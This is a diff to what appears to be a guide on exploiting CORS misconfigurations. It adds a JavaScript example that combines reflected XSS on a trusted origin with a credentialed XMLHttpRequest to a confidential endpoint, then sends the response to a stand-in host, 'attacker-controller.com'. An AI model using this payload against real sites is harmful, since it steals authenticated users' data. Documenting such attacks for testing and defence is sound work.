@@ -136,6 +136,12 @@ again.
 https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
+```js
+<script>
+document.location = "https://trusted-origin.example.com/?xss=<script>var+req+=+new+XMLHttpRequest();req.onload=reqListener; req.open('get','https://website-with-xss.com/endpoint-with-confidential-data',true);req.withCredentials=true;req.send(); function+reqListener()+{location='https://attacker-controller.com?key='%2bthis.responseText;};%3C/script>";
+</script>
+```
+
 ### Vulnerable Example: Wildcard Origin `*` without Credentials
 
 If the server responds with a wildcard origin `*`, **the browser does never send
